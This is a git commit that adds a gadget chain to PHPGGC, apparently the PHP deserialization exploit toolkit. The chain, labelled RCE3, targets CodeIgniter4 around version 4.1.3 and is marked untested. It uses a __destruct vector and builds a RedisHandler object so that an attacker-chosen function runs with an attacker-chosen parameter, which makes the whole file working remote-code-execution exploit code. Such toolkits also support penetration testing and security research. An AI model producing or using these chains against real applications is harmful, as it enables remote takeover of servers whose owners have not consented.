d14fed8e0713b1a8d9c0c6f36593feb15d0555ca
Firebasky <63966847+Firebasky@users.noreply.github.com>
2021-10-10 12:35:29 +0800

    Create chain.php

---
+++ gadgetchains/CodeIgniter4/RCE/3/chain.php
@@ -0,0 +1,18 @@
+<?php
+
+namespace GadgetChain\CodeIgniter4;
+
+class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
+{
+    public static $version = '? <= 4.1.3 <= ?'; //no test
+    public static $vector = '__destruct';
+    public static $author = 'Firebasky';
+
+    public function generate(array $parameters)
+    {
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
+
+        return new \CodeIgniter\Cache\Handlers\RedisHandler($function, $parameter);
+    }
+}
